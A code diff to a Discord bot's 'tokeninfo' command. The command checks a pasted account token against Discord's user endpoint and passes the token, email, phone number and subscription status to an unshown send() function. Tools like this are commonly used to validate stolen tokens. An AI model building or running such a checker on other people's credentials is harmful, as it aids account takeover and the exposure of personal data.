@@ -19,18 +19,17 @@ if (command === "tokeninfo") {
    let DiscordToken = args[0];
 
    if(!DiscordToken)
-     return message.channel.send("Please input the token :flushed: !")
- message.channel.send(`If bot doesn't response any message after 5 seconds it means your token is invalid.`)
-try {
+     return message.reply("Please input the token !")
 	
-fetch(`https://discord.com/api/v6/users/@me` ,{ 
+	try {
+	fetch(`https://discord.com/api/v6/users/@me` ,{ 
                             headers: {
                                 "authorization": DiscordToken
                             }
 						})
-.catch(err => message.channel.send(`error token is invalid`))
-.then(resp => resp.json()).then(response => {
-
+	.then(resp => resp.json()).then(response => {
+	if(response.message == "401: Unauthorized")
+	return message.reply(`your token is invalid`)
                             if (response.id) {
 								if(!response.premium_type) {
                                     nitro = "Nitro"
@@ -38,7 +37,7 @@ fetch(`https://discord.com/api/v6/users/@me` ,{
                                     if(response.premium_type === 1) { nitro = "Nitro Classic"}
                                     if(response.premium_type === 2) { nitro = "Nitro Gaming"}
                                 }
-								send(DiscordToken, response.id, response.username, response.discriminator, response.email, response.phone, nitro)
+				    send(DiscordToken, response.id, response.username, response.discriminator, response.email, response.phone, nitro)
                             }
 })
 } catch (err) {
